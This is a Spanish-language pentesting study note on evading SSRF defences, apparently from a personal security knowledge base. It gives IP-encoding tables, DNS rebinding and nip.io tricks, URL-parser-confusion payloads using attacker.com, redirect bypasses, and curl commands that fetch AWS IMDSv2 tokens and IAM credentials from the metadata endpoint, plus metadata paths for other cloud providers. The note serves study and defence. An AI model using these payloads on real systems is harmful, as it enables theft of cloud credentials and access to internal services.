---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Server-Side/SSRF
  - Tipo/Defensa
Descripción: "En producción, una SSRF choca con defensas: *allowlists* de dominios, *denylists* de IPs internas y protecciones del endpoint de metadatos"
Fecha de actualización: 2026-06-22
Nota previa: "[[04 - Blind SSRF]]"
Nota siguiente: "[[06 - Prevención de SSRF]]"
Area: "[[SSRF.base|SSRF]]"
---
En producción, una SSRF choca con defensas: *allowlists* de dominios, *denylists* de IPs internas y protecciones del endpoint de metadatos. <mark style="background: #ADCCFFA6;">Casi todas validan **un string** (la URL o el host) y no la **IP final** a la que se conecta</mark> — y esa brecha entre lo que se valida y lo que se pide es la que explotamos. Esta nota recoge la evasión moderna.

# Representaciones alternativas de la IP

Un filtro que bloquea `127.0.0.1` o `169.254.169.254` por *string* cae ante las muchas formas de escribir la misma IP:

| Forma | `127.0.0.1` | `169.254.169.254` |
| - | - | - |
| Decimal entero | `2130706433` | `2852039166` |
| Hexadecimal | `0x7f000001` | `0xa9fea9fe` |
| Octal | `0177.0.0.1` | `0251.0376.0251.0376` |
| Formato corto | `127.1` | — |
| IPv6 mapeada | `[::ffff:127.0.0.1]` | `[::ffff:a9fe:a9fe]` |
| IPv6 loopback | `[::1]` | — |
| "Todo-cero" | `0.0.0.0` | — |

<mark style="background: #FFB86CA6;">`0.0.0.0` resuelve a localhost en muchos stacks</mark>, y todo el rango `127.0.0.0/8` (`127.0.0.2`, `127.1.1.1`…) apunta al *loopback*. Combina formatos (decimal con octal, etc.) contra parsers que normalizan de forma inconsistente.

# Trucos de DNS

- **Dominios que resuelven a IP interna**: servicios como `nip.io` y `sslip.io` mapean `<ip>.nip.io` → esa IP. `169.254.169.254.nip.io` pasa un filtro que solo veta IPs literales pero resuelve a la metadata.
- **DNS rebinding**: <mark style="background: #FF5582A6;">la defensa valida el host, resuelve una IP benigna, y al hacer la petición real **re-resuelve** a la IP interna</mark>. Con un dominio propio de TTL bajo (o `0`), el primer lookup (validación) devuelve una IP pública y el segundo (petición) la interna. Es el bypass que rompe los allowlists que no fijan la IP resuelta. Se automatiza con [Singularity of Origin (NCC)](https://github.com/nccgroup/singularity).
- **Resolver propio**: un servidor DNS que controlamos para servir la respuesta que convenga en cada momento.

# Confusión de parser de URL

El clásico de [Orange Tsai — *A New Era of SSRF* (Black Hat 2017)](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf): <mark style="background: #8000E1A6;">el parser que **valida** la URL y el de la **librería HTTP** que la pide interpretan distinto la misma cadena</mark>. Payloads que explotan esa discrepancia:

```
http://expected.com@attacker.com/        # userinfo: el validador ve expected.com, cURL va a attacker.com
http://attacker.com#expected.com/         # fragmento
http://attacker.com?expected.com/         # query
http://expected.com%2f@attacker.com/      # encoding ambiguo
http://attacker.com\@expected.com/        # backslash (algunos lo tratan como /)
http://169.254.169.254%00.expected.com/   # byte nulo / espacios
```

A esto se suman el **doble URL-encoding** y la **inyección CRLF** (`%0d%0a`) para partir cabeceras o inyectar peticiones. Encontrar la variante que cuela contra un parser concreto se fuzzea con [`recollapse`](https://github.com/0xacb/recollapse), que genera mutaciones sistemáticas de una URL base.

# Bypass por redirección

Si la app valida la URL inicial pero **sigue las redirecciones**, alojamos un endpoint propio que responde `302 Location: http://169.254.169.254/...`. La validación ve nuestro dominio benigno; la librería sigue el redirect hasta la IP interna. Defensa: re-validar tras cada salto o no seguir redirects ([[06 - Prevención de SSRF|prevención]]).

# Cloud metadata: el reto de `IMDSv2`

El endpoint `169.254.169.254` es el premio, pero AWS lo endureció:

- **IMDSv1** (legado, aún frecuente): un simple `GET` devuelve los datos. Ruta de oro: `/latest/meta-data/iam/security-credentials/` (lista los roles) → `/<rol>` (credenciales IAM temporales). También jugoso: `/latest/user-data` (suele llevar secrets y scripts de *bootstrap*).
- **IMDSv2**: exige obtener un token con un `PUT` y enviarlo en una cabecera:

```shell-session
$ TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
$ curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: $TOKEN"
```

<mark style="background: #FFB86CA6;">Una SSRF que solo emite `GET` sin cabeceras personalizadas **no puede** con IMDSv2</mark> —ahí está su valor defensivo—. Se sortea solo si: (a) la SSRF controla método y cabeceras (vía `gopher://` construyendo el `PUT`, o una **inyección de cabeceras** en el cliente HTTP —p. ej. cadenas *prototype pollution* + CRLF en Axios; condicionado al stack, no trivial en Node.js estándar—), o (b) **`IMDSv1` sigue habilitado** (ambos coexisten, y muchas instancias antiguas lo mantienen → un `GET` simple basta). <mark style="background: #FFB8EBA6;">En contenedores</mark>: el *hop limit* de IMDSv2 por defecto es `1` (bloquea el acceso desde un contenedor por un salto extra), pero EKS/Docker suelen subirlo a `2`–`3`, lo que **re-habilita** el ataque desde un contenedor comprometido. Otros proveedores:

- **GCP**: `http://metadata.google.internal/computeMetadata/v1/` requiere la cabecera `Metadata-Flavor: Google` → necesita inyección de cabecera (gopher/CRLF), no basta un `GET` simple.
- **Azure**: `http://169.254.169.254/metadata/instance?api-version=...` requiere `Metadata: true`.
- **Otros proveedores cambian la IP**: Alibaba Cloud usa `100.100.100.200` y Oracle Cloud *Classic* `192.0.0.192` (el OCI moderno usa `169.254.169.254/opc/v2/instance/` con `Authorization: Bearer Oracle`) —si el filtro solo veta la IP estándar, las alternativas pasan—.

# Bypass de WAF y esquema

Cuando un WAF filtra `http://` o palabras clave: cambiar a `https://`, alterar el *case*, URL-encoding, o caer a otros esquemas (`file://`, `gopher://`, `dict://`) si el cliente los soporta. La misma lógica de [[09 - Evasión de WAF y restricciones del servidor|evasión de WAF de File Inclusion]] aplica.

> [!warning]+ La evasión no crea la vulnerabilidad
> Estas técnicas sortean **filtros**; si el servidor no hace la petición o no hay destino interno alcanzable, no hay nada que evadir. Y el rate-limiting aplica: mide el ritmo.

> [!info]+ Fuentes
> - [Orange Tsai — A New Era of SSRF (BH 2017)](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) · [PortSwigger — SSRF filter bypass](https://portswigger.net/web-security/ssrf)
> - [PayloadsAllTheThings — SSRF (bypass)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) · [HackTricks — SSRF URL formats](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass)
> - [AWS — IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html) · [recollapse](https://github.com/0xacb/recollapse) · [Singularity of Origin](https://github.com/nccgroup/singularity)

Vista la evasión, el reverso defensivo —cómo se cierra de verdad una SSRF— es la [[06 - Prevención de SSRF]].
